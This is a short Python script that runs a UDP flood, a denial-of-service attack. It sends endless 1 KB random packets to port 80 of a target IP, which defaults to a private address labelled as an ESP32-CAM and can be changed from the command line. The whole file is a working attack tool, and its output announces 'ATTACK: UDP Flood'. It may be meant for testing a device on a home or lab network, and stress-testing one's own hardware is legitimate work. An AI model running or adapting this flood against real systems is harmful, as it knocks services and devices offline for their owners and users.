import socket
import random
import time
import sys

# --- CONFIGURATION ---
TARGET_IP = "192.168.166.167"  # Default ESP32-CAM IP
TARGET_PORT = 80
PACKET_SIZE = 1024 # 1KB

if len(sys.argv) > 1:
    TARGET_IP = sys.argv[1]

print(f"[*] ATTACK: UDP Flood")
print(f"[*] TARGET: {TARGET_IP}:{TARGET_PORT}")
print(f"[*] PRESS CTRL+C TO STOP")
time.sleep(2)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random.randbytes(PACKET_SIZE)

count = 0
try:
    while True:
        sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        count += 1
        if count % 1000 == 0:
            print(f"[!] Sent {count} packets...", end='\r')
except KeyboardInterrupt:
    print(f"\n[+] Stopped. Total: {count}")
